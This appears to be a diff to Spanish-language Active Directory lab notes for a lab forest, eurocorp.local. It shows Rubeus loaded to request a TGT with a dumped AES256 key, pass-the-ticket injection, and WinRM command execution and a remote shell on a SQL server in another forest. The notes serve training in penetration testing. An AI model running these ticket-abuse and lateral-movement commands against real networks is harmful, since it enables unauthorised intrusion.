@@ -139,3 +139,14 @@ Paso 6:
 ❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:dbadmin /aes256:ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f /domain:eu.eurocorp.local /dc:eu-dc.eu.eurocorp.local /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 # Cargar Rubeus en memoria y solicitar un TGT para dbadmin del bosque eurocorp usando su clave AES256 obtenida del dump de LSASS — inyecta el ticket en un proceso sacrificio para acceder al otro bosque de forma OPSEC-friendly.
 ```
+
+```powershell 
+! Usuario: Administrador local o Domain Admin (con TGT de dbadmin inyectado)
+
+❯ C:\AD\Tools\WSManWinRM.exe eu-sql1.eu.eurocorp.local "cmd /c set username & C:\Windows\ccmcache\"
+# Abrir una conexión WinRM hacia eu-sql1 en el bosque eurocorp usando el TGT inyectado — verifica acceso y contexto de usuario en el servidor del otro bosque.
+
+❯ winrs -r:eu-sql1.eu.eurocorp.local cmd
+# Abrir una shell remota en eu-sql1 del bosque eurocorp via WinRM usando el TGT de dbadmin inyectado — confirma acceso interactivo al servidor del otro bosque.
+	❯ set username 
+```
